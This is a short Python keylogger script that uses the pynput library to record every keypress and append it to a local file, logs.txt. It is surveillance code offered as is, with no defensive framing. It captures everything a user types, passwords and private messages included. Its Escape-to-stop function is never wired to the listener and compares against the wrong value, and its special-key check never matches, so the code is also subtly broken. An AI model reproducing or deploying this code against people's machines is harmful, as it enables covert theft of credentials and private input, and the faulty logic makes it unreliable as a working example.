from pynput.keyboard import Listener

def log_keys(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key= ' '
    elif'key'in key:
        key = f"[{key}]"
        
    with open("logs.txt", "a") as log_file:
        log_file.write(key)
        
 #stop listener when the esc key is pressed.       
def stop_keys(key):
    if key == 'key.esc':
        return False
    log_keys(key)        
        
with Listener(on_press=log_keys) as listener:
    listener.join()